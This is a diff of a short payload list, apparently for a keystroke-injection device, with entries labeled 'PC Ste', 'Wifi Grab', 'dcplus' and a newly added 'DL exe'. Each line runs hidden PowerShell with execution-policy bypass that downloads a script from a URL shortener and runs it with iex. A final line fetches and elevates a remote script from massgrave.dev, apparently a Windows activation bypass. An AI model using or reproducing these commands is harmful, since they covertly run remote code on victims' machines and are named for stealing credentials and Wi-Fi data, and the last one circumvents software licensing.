@@ -1,6 +1,8 @@
 PC Ste powershell -w h -NoP -Ep Bypass; irm https://rb.gy/sz67pn | iex > $null 2>&1;exit;
 Wifi Grab powershell -w h -NoP -Ep Bypass; irm https://rb.gy/bk5rpv | iex
 dcplus powershell -w h -NoP -Ep Bypass; irm https://rb.gy/40f010 | iex
+#Este es
+DL exe rs0 irm https://rb.gy/650cr7 | iex
 
 STRING powershell Start-Process powershell -ArgumentList "-Ep Bypass; irm https://massgrave.dev/get | iex" -Verb runAs
 
